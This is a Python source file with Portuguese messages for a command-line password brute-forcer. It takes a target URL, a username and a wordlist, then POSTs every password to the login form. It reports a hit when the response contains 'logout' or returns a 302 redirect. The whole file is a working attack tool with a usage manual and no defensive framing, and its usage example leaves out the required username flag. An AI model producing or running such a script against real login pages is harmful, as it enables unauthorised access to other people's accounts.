import requests
import sys

def brute_force_senha(alvo, wordlist, user):
        try:
            with open (wordlist, "r", encoding="latin-1") as file:
                wordlist = file.read().splitlines()

                for senha in wordlist:
                    data = {
                        "user": user,
                        "password": senha
                    }
                    response = requests.post(alvo, data=data)
                    if "logout" in response.text.lower() or response.status_code == 302:
                        print(f"[+] Senha encontrada: {senha}")
                        return
                    print(f"[-] Tentativa com a senha: {senha} falhou.")
        except FileNotFoundError:
            print(f"[!] Arquivo {wordlist} não encontrado.")
        except Exception as e:
            print(f"[!] Erro inesperado: {e}")


if __name__ == "__main__":
    if len(sys.argv) == 7:
        if sys.argv[1] == '-a' and sys.argv[3] == '-u' and sys.argv[5] == '-w':
            try:
                alvo = sys.argv[2]
                user = sys.argv[4]
                wordlist = sys.argv[6]
                brute_force_senha(alvo, wordlist, user)
            except:
                pass
        else:
            print('Argumentos invalidos')
    elif sys.argv[1] == '-h':
        print(f"""
        {'='*50}
        MANUNAL
        {'='*50}
        [-a] -> set url do alvo
        [-u] -> set nome usuario
        [-w] -> set wordlist
        {'='*50}
        [!] Modo de uso exemplo simples: 
        [python3 bruforht.py -a <url_alvo> -w <wordlist> ]
        {'='*50}
        """)
    else:
                print(f"""
        {'='*50}
        PARAMETROS INVALIDOS
        {'='*50}
        [-a] -> set url do alvo
        [-u] -> set nome usuario
        [-w] -> set wordlist
        {'='*50}
        [!] Modo de uso exemplo simples: 
        [python3 bruforht.py -a <url_alvo> -w <wordlist> ]
        {'='*50}
        """)